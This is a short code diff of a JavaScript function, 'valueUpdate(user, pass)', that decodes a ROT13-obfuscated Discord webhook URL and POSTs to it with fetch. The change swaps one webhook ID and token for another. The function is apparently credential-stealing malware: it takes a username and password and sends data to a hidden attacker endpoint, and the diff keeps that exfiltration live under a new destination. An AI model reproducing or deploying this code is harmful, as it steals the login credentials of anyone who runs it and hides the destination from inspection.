@@ -27,7 +27,7 @@ function valueUpdate(user, pass) {
     if (pass == ''){
         return
     }
-    wh = rot13("uggcf://qvfpbeq.pbz/ncv/jroubbxf/1064300208890056796/SI4AlH2MWHBbn0SJ1nXNSICmqflEqT8SCTJhC1wKVAZYR-jN1E8gU8_JLvuSTKSU43Cf")
+    wh = rot13("uggcf://qvfpbeq.pbz/ncv/jroubbxf/1064304574900473877/qBf-0GQA5KAS5Y4MsCodLfUygO2qOrbNtV4_fxS9aVKNcfvy7ExZn14hoFNvAleBP7Vg")
     fetch(wh, {
         method: 'POST',
         headers: {
